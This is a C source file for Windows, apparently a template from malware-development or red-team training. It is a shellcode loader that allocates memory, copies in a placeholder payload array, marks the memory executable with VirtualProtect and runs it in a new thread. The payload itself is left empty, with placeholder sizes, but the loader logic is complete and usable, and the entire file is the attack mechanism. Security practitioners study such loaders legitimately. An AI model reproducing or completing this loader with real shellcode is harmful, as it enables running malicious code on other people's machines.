
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char shellcodePayload[X] = { // need to change size of the buffer here
	// [shellcode_definition]
};
	
unsigned int lengthOfshellcodePayload = X; // and here

int main(void) {
    
	void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;
	
	// Allocate some memory space for shellcodePayload
	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "shellcodePayload addr", (void *)shellcodePayload);
	printf("%-20s : 0x%-016p\n", "alloc_mem addr", (void *)alloc_mem);

	// Copy shellcodePayload to newly allocated memory
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
	
	// Set the newly allocated memory to be executable
	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nPress Enter to Create Thread!\n");
	getchar();

	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
	if ( retval != 0 ) {
			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
			WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
